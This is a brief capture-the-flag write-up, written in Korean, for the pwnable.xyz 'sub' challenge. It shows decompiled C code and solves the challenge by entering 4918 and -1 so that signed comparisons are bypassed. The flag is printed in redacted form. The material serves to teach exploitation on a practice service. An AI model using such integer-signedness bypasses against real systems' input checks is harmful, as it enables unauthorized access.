# PWNABLE.XYZ 
## sub
~~~c
_int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+0h] [rbp-18h]
  int v5; // [rsp+4h] [rbp-14h]
  unsigned __int64 v6; // [rsp+8h] [rbp-10h]

  v6 = __readfsqword(0x28u);
  sub_A3E(a1, a2, a3);
  v4 = 0;
  v5 = 0;
  _printf_chk(1LL, "1337 input: ");
  _isoc99_scanf("%u %u", &v4, &v5);
  if ( v4 <= 4918 && v5 <= 4918 )
  {
    if ( v4 - v5 == 4919 )
      system("cat /flag");
  }
  else
  {
    puts("Sowwy");
  }
  return 0LL;
}
~~~
코드는 위와 같다. 설마 하면서 4918과 -1을 넣었다. flag를 얻을 수 있었다.
~~~
nc svc.pwnable.xyz 30001
1337 input: 4918 -1
FLAG{***********}
~~~
모든 문제 얘만 같아라ㅋㅋㅋㅋㅋ
